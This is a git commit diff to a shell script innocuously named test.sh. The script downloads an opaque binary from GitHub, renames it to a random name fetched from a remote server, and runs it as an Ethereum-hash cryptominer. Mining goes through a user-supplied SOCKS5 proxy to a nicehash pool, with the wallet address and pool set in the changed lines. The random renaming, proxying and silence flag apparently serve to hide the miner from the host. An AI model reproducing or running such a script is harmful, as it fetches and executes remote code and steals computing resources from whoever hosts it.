c147eb6cd2e67a413a9c755cad050e8f995bc378
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 04:49:13 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -5,9 +5,9 @@ wget https://github.com/rindalasririn/ketaea/raw/main/bubui
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 chmod +x bubui && mv bubui $ACAK
 read -p 'Input Proxy nya: ' PROXY
-WALLET=0xbc48b8bdce572defe4dcab85103f140099bc5af5
-POOL=stratum+ssl://eth-us-west.flexpool.io:5555
-WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
+WALLET=3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri
+POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
+WORKER1=$(echo $(shuf -i 1000-9999 -n 1)TEST)
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
 ./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
